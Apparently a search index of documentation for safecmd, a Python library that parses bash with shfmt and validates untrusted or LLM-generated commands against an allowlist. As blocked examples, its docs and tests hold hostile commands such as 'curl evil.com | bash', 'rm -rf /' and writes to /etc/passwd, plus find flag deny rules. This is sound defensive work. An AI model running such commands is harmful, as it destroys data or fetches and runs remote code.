[
  {
    "objectID": "bashxtract.html",
    "href": "bashxtract.html",
    "title": "Bashxtract API",
    "section": "",
    "text": "safecmd.bashxtract provides tools for parsing and extracting commands from bash command strings. It’s designed for security-conscious applications where you need to understand exactly what commands a shell script will execute before running it.\nThe core use case is validating shell commands from untrusted sources (like LLM-generated commands) against an allowlist. Rather than trying to regex-match bash syntax—which is notoriously tricky—this module uses shfmt, a proper bash parser, to build an AST and then extracts all executable commands from it.\nIt’s likely that the only function you’ll actually need from here is extract_commands. But we provide a full API of all the pieces we use to build that function, which we’ll take you through here.",
    "crumbs": [
      "Bashxtract API"
    ]
  },
  {
    "objectID": "bashxtract.html#introduction",
    "href": "bashxtract.html#introduction",
    "title": "Bashxtract API",
    "section": "",
    "text": "safecmd.bashxtract provides tools for parsing and extracting commands from bash command strings. It’s designed for security-conscious applications where you need to understand exactly what commands a shell script will execute before running it.\nThe core use case is validating shell commands from untrusted sources (like LLM-generated commands) against an allowlist. Rather than trying to regex-match bash syntax—which is notoriously tricky—this module uses shfmt, a proper bash parser, to build an AST and then extracts all executable commands from it.\nIt’s likely that the only function you’ll actually need from here is extract_commands. But we provide a full API of all the pieces we use to build that function, which we’ll take you through here.",
    "crumbs": [
      "Bashxtract API"
    ]
  },
  {
    "objectID": "bashxtract.html#the-problem",
    "href": "bashxtract.html#the-problem",
    "title": "Bashxtract API",
    "section": "The Problem",
    "text": "The Problem\nParsing bash commands is surprisingly tricky. You might think shlex.split would work:\n\ncmd = '''\necho | head 2 &lt;&lt;EOF\nasdf\njkljl\nEOF\n'''\n\n\nshlex.split(cmd)\n\n['echo', '|', 'head', '2', '&lt;&lt;EOF', 'asdf', 'jkljl', 'EOF']\n\n\nBut shlex doesn’t understand bash syntax—it treats |, &lt;&lt;EOF, and the heredoc content as regular arguments. It can’t tell us that echo and head are separate commands in a pipeline, or that the heredoc content is input, not an argument.\nFortunately, there’s a proper bash parser called shfmt that can parse bash into a JSON AST (Abstract Syntax Tree). The shfmt-py package (installed automatically with safecmd) provides the binary:\n\n!shfmt --help 2&gt;&1 | head -6\n\nusage: shfmt [flags] [path ...]\n\nshfmt formats shell programs. If the only argument is a dash ('-') or no\narguments are given, standard input will be used. If a given path is a\ndirectory, all shell scripts found under that directory will be used.\n\n\n\n…and this is the key flag that we will use:\n\n!shfmt --help 2&gt;&1 | grep to-json\n\n  --to-json           print syntax tree to stdout as a typed JSON\n\n\nAs we’ll see below, the AST that shfmt creates represents the structure of the bash command as nested dictionaries. Each node has a Type field telling us what kind of construct it is—CallExpr for a command invocation, BinaryCmd for pipelines and logical operators, Word for arguments, and so on. From this, we can pull out just the information we need.\nFor our heredoc example, what we ultimately want is to extract:\n\nThe commands: ['echo'] and ['head', '2']\nThe operators used: {'|'} (a pipe)\nThe heredoc content attached to the command that receives it\n\nSo our goal is to walk this AST and produce a simple list of commands with their arguments, plus a set of operators—something we can easily validate against an allowlist.\nThe module is structured in layers:\n\nParsing layer (parse_bash): Converts bash syntax to a JSON AST using shfmt\nText extraction (part_text, word_text): Reconstructs text values from AST nodes, handling quotes, escapes, and expansions\nAST walking (visit_stmts, nested_stmts): Recursively traverses the AST to find all commands, including those nested in substitutions\nOperator detection (collect_ops): Identifies shell operators like pipes, redirects, and logical operators\nValidation (check_types): Ensures we only process bash constructs we understand\nMain API (extract_commands): Combines everything into a simple interface",
    "crumbs": [
      "Bashxtract API"
    ]
  },
  {
    "objectID": "bashxtract.html#parsing",
    "href": "bashxtract.html#parsing",
    "title": "Bashxtract API",
    "section": "Parsing",
    "text": "Parsing\n\nsource\n\nparse_bash\n\ndef parse_bash(\n    cmd:str, shfmt:str='shfmt'\n):\n\nParse cmd using shfmt\nParses a bash command string using shfmt --to-json and returns the AST as a Python dict. Raises ValueError if the command has syntax errors. Requires the shfmt binary to be available.\n\nparse_bash('echo hello')\n\n{'Type': 'File',\n 'Pos': {'Offset': 0, 'Line': 1, 'Col': 1},\n 'End': {'Offset': 10, 'Line': 1, 'Col': 11},\n 'Stmts': [{'Pos': {'Offset': 0, 'Line': 1, 'Col': 1},\n   'End': {'Offset': 10, 'Line': 1, 'Col': 11},\n   'Cmd': {'Type': 'CallExpr',\n    'Pos': {'Offset': 0, 'Line': 1, 'Col': 1},\n    'End': {'Offset': 10, 'Line': 1, 'Col': 11},\n    'Args': [{'Pos': {'Offset': 0, 'Line': 1, 'Col': 1},\n      'End': {'Offset': 4, 'Line': 1, 'Col': 5},\n      'Parts': [{'Type': 'Lit',\n        'Pos': {'Offset': 0, 'Line': 1, 'Col': 1},\n        'End': {'Offset': 4, 'Line': 1, 'Col': 5},\n        'ValuePos': {'Offset': 0, 'Line': 1, 'Col': 1},\n        'ValueEnd': {'Offset': 4, 'Line': 1, 'Col': 5},\n        'Value': 'echo'}]},\n     {'Pos': {'Offset': 5, 'Line': 1, 'Col': 6},\n      'End': {'Offset': 10, 'Line': 1, 'Col': 11},\n      'Parts': [{'Type': 'Lit',\n        'Pos': {'Offset': 5, 'Line': 1, 'Col': 6},\n        'End': {'Offset': 10, 'Line': 1, 'Col': 11},\n        'ValuePos': {'Offset': 5, 'Line': 1, 'Col': 6},\n        'ValueEnd': {'Offset': 10, 'Line': 1, 'Col': 11},\n        'Value': 'hello'}]}]},\n   'Position': {'Offset': 0, 'Line': 1, 'Col': 1}}]}",
    "crumbs": [
      "Bashxtract API"
    ]
  },
  {
    "objectID": "bashxtract.html#text-extraction",
    "href": "bashxtract.html#text-extraction",
    "title": "Bashxtract API",
    "section": "Text Extraction",
    "text": "Text Extraction\n\nsource\n\npart_text\n\ndef part_text(\n    p, cmd\n):\n\nExtracts the text value from a single word part node in the shfmt AST.\nHandles literals (with backslash-space unescaping), single/double quoted strings, parameter expansions ($var, ${var}, ${arr[0]}), and command/process substitutions. For substitutions, returns the original source text using offset positions.\n\npart_text({'Type': 'SglQuoted', 'Value': 'foo bar'}, \"echo 'foo bar'\")\n\n'foo bar'\n\n\n\nsource\n\n\nword_text\n\ndef word_text(\n    w, cmd\n):\n\nConverts a Word node (with Parts) into its full text repr by concatenating part_text for each part.\n\nword_text({'Parts': [{'Type': 'Lit', 'Value': 'hello'}]}, 'echo hello')\n\n'hello'\n\n\n\nsource\n\n\nnested_stmts\n\ndef nested_stmts(\n    parts\n):\n\nYield all Stmts lists from nested Parts recursively\nGenerator that recursively yields all Stmts lists found within nested Parts arrays. Used to find command substitutions ($(...)) and process substitutions (&lt;(...)) at any nesting depth, including those inside double-quoted strings.",
    "crumbs": [
      "Bashxtract API"
    ]
  },
  {
    "objectID": "bashxtract.html#ast-walking",
    "href": "bashxtract.html#ast-walking",
    "title": "Bashxtract API",
    "section": "AST Walking",
    "text": "AST Walking\n\nparts = [{'Type': 'CmdSubst', 'Stmts': [{'Cmd': {...}}]}]\nlist(nested_stmts(parts))\n\n[[{'Cmd': {Ellipsis}}]]\n\n\n\nsource\n\nvisit_stmts\n\ndef visit_stmts(\n    stmts, cmd, commands:NoneType=None\n):\n\nVisit statements, appending commands and handling redirects\nWalks a list of statement nodes from the shfmt AST, extracting all commands (including nested ones) into the commands list. Each command is represented as [cmd, arg1, arg2, ...]. Handles redirects by appending heredoc/here-string content to the most recent command. Returns the commands list.\n\nparsed = parse_bash('echo foo; cat file')\nvisit_stmts(parsed['Stmts'], 'echo foo; cat file')\n\n[['echo', 'foo'], ['cat', 'file']]\n\n\n\nsource\n\n\ncollect_ops\n\ndef collect_ops(\n    node, ops:NoneType=None\n):\n\nWalk AST node and collect all operators into a set\nDetects &, ;, logical AND/OR (&&/||), pipe (|), and redirections (&gt;, &gt;&gt;, &lt;) by checking the Op field against OP_MAP and the Background/Semicolon boolean flags.\n\ncollect_ops(parse_bash('echo a && echo b | cat &gt; out.txt'))\n\n{'&&', '&gt;', '|'}\n\n\n\nsource\n\n\ncollect_redirects\n\ndef collect_redirects(\n    node, cmd, redirects:NoneType=None\n):\n\nWalk AST node and collect all write redirect destinations as (op, dest) tuples\ncollect_redirects extracts all write redirect destinations from the AST. For each output redirect (&gt;, &gt;&gt;, &&gt;, &&gt;&gt;, &gt;&), it returns a tuple of (operator, destination). This is used to validate that commands only write to allowed destinations.\n\ncmd = 'echo a && echo b | cat &gt; out.txt'\ncollect_redirects(parse_bash(cmd), cmd)\n\n[('&gt;', 'out.txt')]\n\n\n\nfrom fastcore.test import test_eq\n\n\ndef _redirects(cmd): return collect_redirects(parse_bash(cmd), cmd)\n\ntest_eq(_redirects('echo hi &gt; out.txt'), [('&gt;', 'out.txt')])\ntest_eq(_redirects('echo hi &gt;&gt; log.txt'), [('&gt;&gt;', 'log.txt')])\ntest_eq(_redirects('echo hi &&gt; both.txt'), [('&&gt;', 'both.txt')])\ntest_eq(_redirects('cat &gt; a &gt; b'), [('&gt;', 'a'), ('&gt;', 'b')])\ntest_eq(_redirects('echo hi | cat'), [])  # no redirects\ntest_eq(_redirects('echo hi &lt; in.txt'), [])  # input redirect, not output\ntest_eq(_redirects('cmd &gt; \"$HOME/file\"'), [('&gt;', '$HOME/file')])  # variable in dest\n\n\nsource\n\n\nscan_flag_args\n\ndef scan_flag_args(\n    commands, exec_flags:NoneType=None, dest_flags:NoneType=None\n):\n\nScan commands for exec/dest flags and extract their arguments\nscan_flag_args scans a list of extracted commands for special flags that take command or destination arguments. It takes two dicts mapping command names to sets of flags:\n\nexec_flags: flags whose next arg is a command to validate (e.g., {'find': {'-exec', '-execdir'}})\ndest_flags: flags whose next arg is a destination to validate (e.g., {'curl': {'-o', '--output'}})\n\nReturns (extra_cmds, extra_dests) where extra_cmds is a list of command strings to parse recursively, and extra_dests is a list of (flag, dest) tuples to validate as redirect destinations.\n\nexec_flags = {'find': {'-exec', '-execdir'}}\ndest_flags = {'curl': {'-o', '--output'}}\n\n# Find with -exec extracts the command arg\nscan_flag_args([['find', '.', '-exec', 'ls', '{}', ';']], exec_flags=exec_flags)\n\n(['ls'], [])\n\n\n\n# curl with -o extracts the destination\nscan_flag_args([['curl', '-o', '/tmp/file', 'http://example.com']], dest_flags=dest_flags)\n\n([], [('-o', '/tmp/file')])\n\n\n\n# cat -o is NOT treated as a dest flag (not in dest_flags for cat)\nscan_flag_args([['cat', '-o', '/etc/passwd']], dest_flags=dest_flags)\n\n([], [])\n\n\n\nsource\n\n\ncheck_types\n\ndef check_types(\n    node\n):\n\nRaise ValueError if AST contains unhandled node types\nRaises ValueError if any node has a Type not in HANDLED_TYPES. Use this to detect unsupported bash constructs early, ensuring the rest of the parsing pipeline won’t silently skip or mishandle unknown syntax.\n\ncheck_types(parse_bash('echo hello'))\n\n\ntry: check_types(parse_bash('[[ -f foo ]]'))\nexcept ValueError: print('Caught unhandled construct')\n\nCaught unhandled construct",
    "crumbs": [
      "Bashxtract API"
    ]
  },
  {
    "objectID": "bashxtract.html#main-api",
    "href": "bashxtract.html#main-api",
    "title": "Bashxtract API",
    "section": "Main API",
    "text": "Main API\n\nsource\n\nextract_commands\n\ndef extract_commands(\n    cmd, shfmt:str='shfmt', exec_flags:NoneType=None, dest_flags:NoneType=None\n):\n\nSplit bash command into (commands, operators, redirects)\nextract_commands(cmd, exec_flags=None, dest_flags=None) parses a bash command string and returns a 3-tuple of: 1. A list of all commands that would be executed (including nested ones) 2. A set of operators used in the command 3. A list of write redirect destinations as (op, dest) tuples\nEach command is represented as a list of tokens (strings), similar to the output of shlex.split(). The function uses shfmt to parse the bash syntax into an AST, then extracts all executable commands recursively.\nOptional parameters: - exec_flags: dict mapping command names to sets of flags whose next arg is a command (e.g., {'find': {'-exec'}}). These are parsed recursively and added to commands. - dest_flags: dict mapping command names to sets of flags whose next arg is a destination (e.g., {'curl': {'-o'}}). These are added to redirects.\nHandled constructs: - Simple commands: echo foo → [['echo', 'foo']] - Pipelines: cat file | grep x → [['cat', 'file'], ['grep', 'x']] - Sequences (;, &, &&, ||): echo a; echo b → [['echo', 'a'], ['echo', 'b']] - Command substitution: echo $(whoami) → [['echo', '$(whoami)'], ['whoami']] - Backtick substitution: echo `whoami` → [['echo', 'whoami'], ['whoami']] - Process substitution: diff &lt;(ls a) &lt;(ls b) → [['diff', ...], ['ls', 'a'], ['ls', 'b']] - Subshells: (cd /tmp && rm *) → [['cd', '/tmp'], ['rm', '*']] - Nested substitutions are extracted recursively - Heredocs (&lt;&lt;EOF) and here-strings (&lt;&lt;&lt;) have their content inlined as a single token - Quoted strings and escaped spaces are handled correctly, preserving them as single tokens - Output redirects: echo hi &gt; file.txt → redirects: [('&gt;', 'file.txt')] - Exec flags: find . -exec ls with exec_flags={'find': {'-exec'}} → adds ['ls'] to commands - Dest flags: curl -o /tmp/f url with dest_flags={'curl': {'-o'}} → adds ('-o', '/tmp/f') to redirects\nThe tests below show the full behavior:\n\nfrom fastcore.test import test_eq\n\n\ndef test_split(a, *b, ops=set(), redirs=[]):\n    test_eq(extract_commands(a), (list(b), ops, redirs))\n\n\ntest_split('echo &lt;&lt;EOF\\nasdf\\njkljl\\nEOF\\n', ['echo', 'asdf\\njkljl'])\ntest_split('echo $(foo)', ['echo', '$(foo)'], ['foo'])\ntest_split('echo $(foo) | cat -a', ['echo', '$(foo)'], ['foo'], ['cat', '-a'], ops={'|'})\ntest_split('echo $(cat $(ls))', ['echo', '$(cat $(ls))'], ['cat', '$(ls)'], ['ls'])\ntest_split('echo \"hello world\" foo', ['echo', 'hello world', 'foo'])\ntest_split('echo hello\\\\ world', ['echo', 'hello world'])\ntest_split('echo foo; echo bar', ['echo', 'foo'], ['echo', 'bar'], ops={';'})\ntest_split('echo $HOME \"${USER}\"', ['echo', '$HOME', '${USER}'])\ntest_split('sleep 10 &', ['sleep', '10'], ops={';', '&'})\ntest_split('cat &lt;&lt;&lt; \"some text\"', ['cat', '&lt;&lt;&lt;', 'some text'])\ntest_split(\"echo \\\"it's a 'test'\\\"\", ['echo', \"it's a 'test'\"])\ntest_split('echo \"hello $(whoami) there\"', ['echo', 'hello $(whoami) there'], ['whoami'])\ntest_split('echo \"path is ${HOME}/bin\"', ['echo', 'path is ${HOME}/bin'])\ntest_split('echo ${arr[0]}', ['echo', '${arr[0]}'])\ntest_split('echo \"$(echo \"inner\")\"', ['echo', '$(echo \"inner\")'], ['echo', 'inner'])\ntest_split('echo \"$HOME/$(whoami)/file\"', ['echo', '$HOME/$(whoami)/file'], ['whoami'])\ntest_split('echo `whoami`', ['echo', '`whoami`'], ['whoami'])\ntest_split('(cd /tmp && rm -rf *)', ['cd', '/tmp'], ['rm', '-rf', '*'], ops={'&&'})\ntest_split('eval \"rm -rf /\"', ['eval', 'rm -rf /'])\ntest_split('echo a && echo b || echo c', ['echo', 'a'], ['echo', 'b'], ['echo', 'c'], ops={'&&', '||'})\ntest_split('cat file &gt; out', ['cat', 'file'], ops={'&gt;'}, redirs=[('&gt;', 'out')])\ntest_split('cat file &gt;&gt; out', ['cat', 'file'], ops={'&gt;&gt;'}, redirs=[('&gt;&gt;', 'out')])\ntest_split('cat &lt; in', ['cat'], ops={'&lt;'})\ntest_split('diff &lt;(ls dir1) &lt;(ls dir2)',\n    ['diff', '&lt;(ls dir1)', '&lt;(ls dir2)'], ['ls', 'dir1'], ['ls', 'dir2'])\ntest_split('FOO=bar', ops={'='})\ntest_split('FOO=bar echo hello', ['echo', 'hello'], ops={'='})\ntest_split('for i in a b c; do echo $i; done', ['echo', '$i'], ops={';'})\n\n\ntest_split('echo &&gt;file', ['echo'], ops={'&&gt;'}, redirs=[('&&gt;', 'file')])\ntest_split('echo &&gt;&gt;file', ['echo'], ops={'&&gt;&gt;'}, redirs=[('&&gt;&gt;', 'file')])\ntest_split('echo |& cat', ['echo'], ['cat'], ops={'|&'})\n\n# fd duplication - not file redirects, so no redirs\ntest_split('echo &gt;&2', ['echo'], ops={'&gt;&'})\ntest_split('cat &lt;&3', ['cat'], ops={'&lt;&'})\n\n\nexec_flags = {'find': {'-exec', '-execdir'}, 'tar': {'--to-command', '-I'}}\ndest_flags = {'curl': {'-o', '--output'}}\n\ndef test_split_flags(a, *b, ops=set(), redirs=[], exec_f=exec_flags, dest_f=dest_flags):\n    test_eq(extract_commands(a, exec_flags=exec_f, dest_flags=dest_f), (list(b), ops, redirs))\n\n\n# find -exec extracts and validates the command\ntest_split_flags('find . -exec ls', ['find', '.', '-exec', 'ls'], ['ls'])\ntest_split_flags(r'find . -exec rm -rf {} \\;', ['find', '.', '-exec', 'rm', '-rf', '{}', r'\\;'], ['rm'])\ntest_split_flags(r'find . -execdir cat {} \\;', ['find', '.', '-execdir', 'cat', '{}', r'\\;'], ['cat'])\n\n# curl -o extracts the destination\ntest_split_flags('curl -o /tmp/out http://x', ['curl', '-o', '/tmp/out', 'http://x'], redirs=[('-o', '/tmp/out')])\ntest_split_flags('curl --output file.txt http://x', ['curl', '--output', 'file.txt', 'http://x'], redirs=[('--output', 'file.txt')])\n\n# cat -o is NOT a dest flag (cat not in dest_flags)\ntest_split_flags('cat -o /etc/passwd', ['cat', '-o', '/etc/passwd'])\n\n# Nested: find -exec with a pipeline inside\ntest_split_flags('find . -exec \"ls | head\"', ['find', '.', '-exec', 'ls | head'], ['ls'], ['head'], ops={'|'})",
    "crumbs": [
      "Bashxtract API"
    ]
  },
  {
    "objectID": "index.html",
    "href": "index.html",
    "title": "safecmd",
    "section": "",
    "text": "Running shell commands from untrusted sources—like LLM-generated code, user input, or third-party scripts—is risky. A command that looks innocent might contain hidden redirects, command substitutions, or dangerous flags that could modify or delete files, exfiltrate data, or worse.\nsafecmd solves this by validating bash commands against an allowlist before execution. Instead of trying to blacklist dangerous patterns (which is error-prone and easy to bypass), safecmd uses a generous allowlist of read-only and easily-reverted commands that are safe to run.\nThe key innovation is that safecmd uses a proper bash parser (shfmt) to build an AST (Abstract Syntax Tree) of your command. This means it correctly handles complex bash syntax—pipelines, command substitutions, subshells, heredocs, and more—extracting and validating every command, even nested ones, before anything executes.\nThe result: you can safely run commands like git log | grep \"fix\" or find . -name \"*.py\" | xargs cat knowing that if someone tries to sneak in rm -rf / or curl evil.com | bash, it’ll be blocked before it runs. This makes safecmd ideal for building LLM-powered CLI tools, interactive shells that accept user input, or automation pipelines that process untrusted scripts.\n\n\nInstall safecmd from PyPI:\npip install safecmd\nThis will automatically install the shfmt-py dependency, which provides the shfmt binary. If you’re doing a local user install (pip install --user), make sure ~/.local/bin is in your PATH.",
    "crumbs": [
      "safecmd"
    ]
  },
  {
    "objectID": "index.html#introduction",
    "href": "index.html#introduction",
    "title": "safecmd",
    "section": "",
    "text": "Running shell commands from untrusted sources—like LLM-generated code, user input, or third-party scripts—is risky. A command that looks innocent might contain hidden redirects, command substitutions, or dangerous flags that could modify or delete files, exfiltrate data, or worse.\nsafecmd solves this by validating bash commands against an allowlist before execution. Instead of trying to blacklist dangerous patterns (which is error-prone and easy to bypass), safecmd uses a generous allowlist of read-only and easily-reverted commands that are safe to run.\nThe key innovation is that safecmd uses a proper bash parser (shfmt) to build an AST (Abstract Syntax Tree) of your command. This means it correctly handles complex bash syntax—pipelines, command substitutions, subshells, heredocs, and more—extracting and validating every command, even nested ones, before anything executes.\nThe result: you can safely run commands like git log | grep \"fix\" or find . -name \"*.py\" | xargs cat knowing that if someone tries to sneak in rm -rf / or curl evil.com | bash, it’ll be blocked before it runs. This makes safecmd ideal for building LLM-powered CLI tools, interactive shells that accept user input, or automation pipelines that process untrusted scripts.\n\n\nInstall safecmd from PyPI:\npip install safecmd\nThis will automatically install the shfmt-py dependency, which provides the shfmt binary. If you’re doing a local user install (pip install --user), make sure ~/.local/bin is in your PATH.",
    "crumbs": [
      "safecmd"
    ]
  },
  {
    "objectID": "index.html#quick-start",
    "href": "index.html#quick-start",
    "title": "safecmd",
    "section": "Quick Start",
    "text": "Quick Start\n\nfrom safecmd import safe_run\n\nBy default, safe_run allows common read-only commands like cat, grep, ls, head, tail, diff, wc, and safe git subcommands (git log, git status, git diff). It also includes gh, npm/yarn, docker, aws, gcloud, and other common tools.\nCommands like find have exec flags configured: find . -exec ls passes (since ls is allowed) but find . -exec rm fails (since rm isn’t). Commands like curl have dest flags: curl -o /tmp/file passes but curl -o /etc/passwd fails. Output redirects (&gt;, &gt;&gt;) are allowed but only to the current directory (./) or /tmp.\nBash command lines that are generally safe run as usual:\n\nsafe_run('ls -la | grep index')\n\n'-rw-------@  1 jhoward  staff  13289 Jan 23 08:11 index.ipynb'\n\n\nHowever, any command or op not on the allowed list results in an exception - including in nested commands, pipelines, and so forth:\n\nsafe_run('echo $(rm -rf /danger)')\n\n\n---------------------------------------------------------------------------\nDisallowedCmd                             Traceback (most recent call last)\nCell In[1], line 2\n      1 #| eval:false\n----&gt; 2 safe_run('echo $(rm -rf /danger)')\n\nFile ~/aai-ws/safecmd/safecmd/core.py:257, in safe_run(cmd, cmds, dests, add_cmds, add_dests, rm_cmds, rm_dests, ignore_ex)\n    254 eff_cmds |= _split_specs(add_cmds)\n    255 eff_cmds -= {CmdSpec(c) for c in _split_set(rm_cmds)}\n--&gt; 257 validate(cmd, eff_cmds, eff_dests)\n    258 return run(cmd, ignore_ex=ignore_ex)\n\nFile ~/aai-ws/safecmd/safecmd/core.py:233, in validate(cmd, cmds, dests)\n    231 commands, ops, redirects = extract_commands(cmd, exec_flags=exec_flags, dest_flags=dest_flags)\n    232 for c in commands:\n--&gt; 233     if not validate_cmd(c, cmds): raise DisallowedCmd(c)\n    234 for op, dest in redirects:\n    235     if not validate_dest(dest, dests): raise DisallowedDest(dest)\n\nDisallowedCmd: rm -rf /danger\n\n\n\n\nsafe_run('echo danger &gt; /nonexistent/badpath')\n\n\n---------------------------------------------------------------------------\nDisallowedDest                            Traceback (most recent call last)\nCell In[1], line 2\n      1 #| eval:false\n----&gt; 2 safe_run('echo danger &gt; /nonexistent/badpath')\n\nFile ~/aai-ws/safecmd/safecmd/core.py:257, in safe_run(cmd, cmds, dests, add_cmds, add_dests, rm_cmds, rm_dests, ignore_ex)\n    254 eff_cmds |= _split_specs(add_cmds)\n    255 eff_cmds -= {CmdSpec(c) for c in _split_set(rm_cmds)}\n--&gt; 257 validate(cmd, eff_cmds, eff_dests)\n    258 return run(cmd, ignore_ex=ignore_ex)\n\nFile ~/aai-ws/safecmd/safecmd/core.py:235, in validate(cmd, cmds, dests)\n    233     if not validate_cmd(c, cmds): raise DisallowedCmd(c)\n    234 for op, dest in redirects:\n--&gt; 235     if not validate_dest(dest, dests): raise DisallowedDest(dest)\n\nDisallowedDest: /nonexistent/badpath\n\n\n\n\nsafe_run('sudo ls')\n\n\n---------------------------------------------------------------------------\nDisallowedCmd                             Traceback (most recent call last)\nCell In[1], line 2\n      1 #| eval:false\n----&gt; 2 safe_run('sudo ls')\n\nFile ~/teach/safecmd/safecmd/core.py:93, in safe_run(cmd, cmds, ops)\n     91 if bad_ops := used_ops - ops: raise DisallowedOps(bad_ops)\n     92 for c in commands:\n---&gt; 93     if not validate_cmd(c, cmds): raise DisallowedCmd(c)\n     94 return run(cmd)\n\nDisallowedCmd: Disallowed command: sudo ls\n\n\n\nTo see the current allowlist, check the configuration file stored in ~/.config/safecmd/config.ini (Linux), ~/Library/Application Support/safecmd/config.ini (macOS), or %LOCALAPPDATA%\\safecmd\\config.ini (Windows). Edit this file to customize your allowlist permanently, or pass custom values directly to safe_run().\n\nfrom fastcore.xdg import xdg_config_home\n\n\ncfg_path = xdg_config_home() / 'safecmd' / 'config.ini'\nprint(cfg_path.read_text())\n\n[DEFAULT]\nok_ops = |, &lt;, &&, ||, ;\n\nok_cmds = cat, head, tail, less, more, bat\n    # Directory listing\n    ls, tree, locate\n    # Search\n    grep, rg, ag, ack, fgrep, egrep\n    # Text processing\n    cut, sort, uniq, wc, tr, column\n    # File info\n    file, stat, du, df, which, whereis, type\n    # Comparison\n    diff, cmp, comm\n    # Archives\n    tar, unzip, gunzip, bunzip2, unrar\n    # Network\n    curl, wget, ping, dig, nslookup, host\n    # System info\n    date, cal, uptime, whoami, hostname, uname, env, printenv\n    # Utilities\n    echo, printf, yes, seq, basename, dirname, realpath\n    # Git (read-only)\n    git log, git show, git diff, git status, git branch, git tag, git remote,\n    git stash list, git blame, git shortlog, git describe, git rev-parse,\n    git ls-files, git ls-tree, git cat-file, git config --get, git config --list\n    # Git (workspace)\n    git fetch, git add, git commit, git switch, git checkout\n    # Find with deny-list\n    find:-exec|-execdir|-delete|-ok|-okdir",
    "crumbs": [
      "safecmd"
    ]
  },
  {
    "objectID": "index.html#how-it-works",
    "href": "index.html#how-it-works",
    "title": "safecmd",
    "section": "How It Works",
    "text": "How It Works\nWhen you call safe_run(), safecmd doesn’t just string-match or regex your command—it properly parses it. Here’s what happens:\n1. Parse the bash command into an AST\nsafecmd uses shfmt, a robust bash parser written in Go, to convert your command string into a JSON Abstract Syntax Tree. This is the same parser used by shell formatters and linters, so it handles all the edge cases that trip up naive approaches: quoted strings, escaped characters, heredocs, nested substitutions, and more.\nFor example, the command echo \"hello\" | grep h becomes a tree structure showing that there’s a pipeline with two commands (echo and grep), each with their arguments properly identified.\n2. Extract all commands recursively\nsafecmd walks the AST and extracts every command that would be executed—including commands hidden inside: - Pipelines (cmd1 | cmd2) - Command substitutions ($(cmd) or `cmd`) - Subshells ((cmd)) - Logical chains (cmd1 && cmd2, cmd1 || cmd2)\nThis is crucial: a command like ls $(rm -rf /) looks like it starts with ls, but the nested rm would execute first. safecmd catches this because it extracts all commands from the AST.\n3. Validate against the allowlist\nEach extracted command is checked against ok_cmds using prefix matching. A simple entry like 'ls' allows ls, ls -la, ls /home. A multi-word entry like 'git status' only matches commands starting with those exact words—so git status is allowed but git push is not.\nSome commands have a denied flags list—flags that will cause rejection. For instance, find blocks -delete which would remove files.\nSome flags take arguments that themselves need validation: - Exec flags (like find -exec) have a next argument that’s a command—this is parsed and validated recursively. So find . -exec ls passes but find . -exec rm fails. - Dest flags (like curl -o) have a next argument that’s an output destination—this is validated against ok_dests. So curl -o /tmp/file passes but curl -o /etc/passwd fails.\n4. Validate redirect destinations\nOutput redirects (&gt;, &gt;&gt;, &&gt;, etc.) are extracted and their destinations validated against ok_dests. By default, redirects can only write to the current directory (./) or /tmp. All paths are resolved to absolute paths before matching, which prevents path traversal attacks like ./.. or ./subdir/../../escape.\n5. Execute if safe\nOnly after all commands and redirect destinations pass validation does safecmd actually run the command. If anything fails validation, you get a DisallowedCmd or DisallowedDest exception—nothing executes.",
    "crumbs": [
      "safecmd"
    ]
  },
  {
    "objectID": "index.html#when-to-use-safecmd",
    "href": "index.html#when-to-use-safecmd",
    "title": "safecmd",
    "section": "When to Use safecmd",
    "text": "When to Use safecmd\nsafecmd is designed for situations where you need to run shell commands that you don’t fully control. Common use cases include:\nLLM-powered tools: If you’re building an AI assistant that can run shell commands (like solveit itself), safecmd lets you execute LLM-generated commands without worrying that a hallucination or prompt injection will cause damage.\nInteractive CLIs: Building a tool where users type shell commands? safecmd lets you offer shell functionality while preventing users (or attackers) from running dangerous commands.\nAutomation pipelines: Processing scripts or commands from external sources—config files, APIs, webhooks—where you want to allow some shell operations but not arbitrary code execution.\nSandboxed environments: When you want to give users shell access but restrict what they can do, safecmd provides a lightweight alternative to containerization for command-level restrictions.\nsafecmd is not a replacement for proper sandboxing if you’re running completely untrusted code. It’s best suited for scenarios where you want to allow a known set of useful commands while blocking obviously dangerous ones. It does not provide protection from an adversary proactively trying to break in, and does not provide any guarantees.",
    "crumbs": [
      "safecmd"
    ]
  },
  {
    "objectID": "core.html",
    "href": "core.html",
    "title": "Core API",
    "section": "",
    "text": "safecmd.core provides a safe execution layer for shell commands. It’s designed for situations where you need to run bash commands from untrusted sources—such as LLM-generated commands—while ensuring they can’t modify your system in dangerous ways.\nThe module builds on top of safecmd.bashxtract (which parses bash into an AST and extracts commands) to validate commands against an allowlist before execution. The key insight is that rather than trying to blacklist dangerous commands (which is error-prone), we whitelist a generous set of read-only and easily-reverted commands that are safe to run.\nThe core workflow is:\n\nParse the bash command string using extract_commands() from bashxtract\nCheck each extracted command against ok_cmds (the allowlist). Commands inside substitutions ($(...)), subshells, pipelines, etc are extracted recursively, so nested commands are also validated.\nCheck that output redirects only write to allowed destinations (default: ./ and /tmp)\nIf everything passes, execute the command and return the result\n\nThis approach handles complex bash syntax correctly—pipelines, command substitutions, subshells, and more—because it uses a proper bash parser rather than regex or string splitting.\nThe allowlist (ok_cmds) uses prefix matching to determine if a command is permitted. A simple entry like 'ls' matches any command starting with ls—so ls, ls -la, and ls /home/user are all allowed. A multi-word entry like 'git status' only matches commands that start with both those words—so git status and git status --short are allowed, but git push is not.\nThis prefix approach lets you be precise about which subcommands are safe. For instance, you might allow git log, git status, and git diff (all read-only) while blocking git push and git reset (which modify state).\nSome commands are mostly safe but have a few dangerous flags. For these cases, you can specify a denied list of flags that will cause the command to be rejected. For example, find allows searching but blocks -delete which would remove files.\nSome flags take arguments that themselves need validation. Exec flags (like find -exec) have a next argument that’s a command—this command is parsed and validated recursively. So find . -exec ls passes (since ls is allowed) but find . -exec rm fails. Dest flags (like curl -o) have a next argument that’s an output destination—this is validated against ok_dests. So curl -o /tmp/file url passes but curl -o /etc/passwd url fails.\nOutput redirects (&gt;, &gt;&gt;, etc.) are also validated. By default, redirects can only write to the current directory (./) or /tmp. Bare relative paths like file.txt are normalized to ./file.txt before matching. You can customize allowed destinations via ok_dests.\nThe first time this module is used a config file (config.ini) is created with the default configuration. The file location follows the XDG Base Directory spec via xdg_config_home():\n\nLinux: ~/.config/safecmd/config.ini\nmacOS: ~/Library/Application Support/safecmd/config.ini\nWindows: %LOCALAPPDATA%\\safecmd\\config.ini (typically C:\\Users\\&lt;username&gt;\\AppData\\Local\\safecmd\\config.ini)\n\nThis file can be edited to change configuration.",
    "crumbs": [
      "Core API"
    ]
  },
  {
